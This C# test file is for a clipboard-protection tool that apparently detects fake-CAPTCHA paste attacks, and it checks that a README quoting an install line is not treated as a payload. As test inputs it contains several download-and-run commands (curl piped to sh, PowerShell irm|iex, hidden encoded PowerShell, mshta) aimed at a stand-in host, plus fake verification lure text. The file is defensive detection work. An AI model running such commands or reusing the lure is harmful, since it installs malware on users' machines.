using ClipGuard.Models;
using ClipGuard.Services;

namespace ClipGuard.Tests;

/// <summary>
/// Documentation is not an attack. These exist because of a real false
/// positive: copying a project README that quotes one <c>curl … | sh</c>
/// install line was reported as a fake-CAPTCHA attack, and defusing replaced
/// several pages of the user's own text with a one-line stand-in.
/// </summary>
public class CommandShapeTests
{
    /// <summary>
    /// Trimmed from the document that actually triggered the false positive.
    /// The install line is genuine and dangerous-shaped; the content around it
    /// is what makes this a document rather than a payload.
    /// </summary>
    private const string Readme = """
        Mise
        Recipes and prep lists for professional kitchens, running on your own server.

        Recipes in Mise are written like specs: weights, yields, sub-recipes and
        allergens. Put tonight's dishes and covers on a service and Mise writes the
        prep list for each station, adding up anything two dishes share.

        One server is one kitchen. Your recipes stay on a machine you own, and
        there's no account or subscription anywhere else.

        Install
        You need a computer that stays on in the restaurant with Docker installed.
        Then run:

        curl -fsSL https://raw.githubusercontent.com/SandSlideStudio/Mise/main/deploy/install.sh | sh

        That creates a mise-kitchen folder, writes a .env with new secrets, starts
        Mise and prints a setup link. Open it in a browser and the setup screens
        take you through naming the kitchen, your account, stations and staff.

        Tablets and sign-in
        Chefs and managers sign in with an email and password, on any device.
        Cooks sign in on a kitchen tablet by tapping their name and typing a PIN.

        Backups
        Mise backs the kitchen up every night by itself: the data and the plating
        photos, in one encrypted file. Keep a copy off the machine.
        """;

    // ── The shape test itself ─────────────────────────────────────────────

    [Fact]
    public void A_readme_quoting_an_install_line_is_not_command_shaped()
    {
        // The pattern match is correct and stays correct: the document does
        // contain a download-and-run command.
        Assert.True(RiskAnalyzer.IsShellCommand(Readme));

        // It is still a document, so it is not a payload.
        Assert.False(RiskAnalyzer.IsCommandShaped(Readme));
    }

    [Theory]
    [InlineData("curl -fsSL https://evil.test/install.sh | sh")]
    [InlineData("  irm https://evil.test/a.ps1 | iex  ")]
    [InlineData("powershell -nop -w hidden -enc SGVsbG8=")]
    [InlineData("mshta https://evil.test/payload.hta")]
    public void A_bare_command_is_command_shaped(string payload) =>
        Assert.True(RiskAnalyzer.IsCommandShaped(payload));

    [Fact]
    public void A_payload_carrying_a_short_fake_captcha_note_is_command_shaped() =>
        Assert.True(RiskAnalyzer.IsCommandShaped(
            "powershell -nop -w hidden -c \"irm https://evil.test/a.ps1 | iex\"\n"
            + "# I am not a robot - Verification ID: 7731"));

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   \n  \n ")]
    [InlineData("ordinary notes with no command in them at all")]
    public void Content_with_no_command_is_not_command_shaped(string? text) =>
        Assert.False(RiskAnalyzer.IsCommandShaped(text));

    // ── What the policy does with it ──────────────────────────────────────

    private static DetectionInputs Copied(string? text, string? previous = null) => new()
    {
        Text = text,
        Previous = previous,
        WriterName = "msedge.exe",
        ArrivedRapidly = false,
        FromBackgroundApp = false,
        TrustedSources = []
    };

    [Fact]
    public void Copying_a_readme_warns_about_nothing_and_keeps_the_clipboard()
    {
        var outcome = DetectionPolicy.Evaluate(Copied(Readme, previous: "earlier note"));

        Assert.False(outcome.Warn);
        Assert.False(outcome.Block);
        Assert.False(outcome.HighRisk);

        // The important one. Defusing a document would replace the user's text
        // with "Clipboard entry expired", which is the failure that prompted
        // all of this.
        Assert.False(outcome.Defuse);
        Assert.Equal(EventCategory.ClipboardWrite, outcome.Category);
    }

    [Fact]
    public void Copying_the_same_install_line_on_its_own_is_still_caught()
    {
        var outcome = DetectionPolicy.Evaluate(Copied(
            "curl -fsSL https://raw.githubusercontent.com/SandSlideStudio/Mise/main/deploy/install.sh | sh"));

        // raw.githubusercontent.com is deliberately not a trusted install host,
        // so the line by itself is treated as a payload. Narrowing the warning
        // to command-shaped content must not weaken that.
        Assert.True(outcome.Warn);
        Assert.True(outcome.Defuse);
    }

    [Fact]
    public void A_padded_payload_is_still_caught_when_it_wears_a_captcha_note()
    {
        // The shape test is a heuristic, and prose padding is the obvious way
        // to try to slip past it. The lure override is what closes that off for
        // the ClickFix playbook specifically.
        var padded = string.Join("\n", Enumerable.Repeat("Some filler prose line.", 30))
                     + "\npowershell -nop -w hidden -c \"irm https://evil.test/a.ps1 | iex\""
                     + "\n# reCAPTCHA human verification - Ray ID: 8f21";

        Assert.False(RiskAnalyzer.IsCommandShaped(padded));
        Assert.True(RiskAnalyzer.IsVerificationLure(padded));
        Assert.True(DetectionPolicy.Evaluate(Copied(padded)).Warn);
    }
}
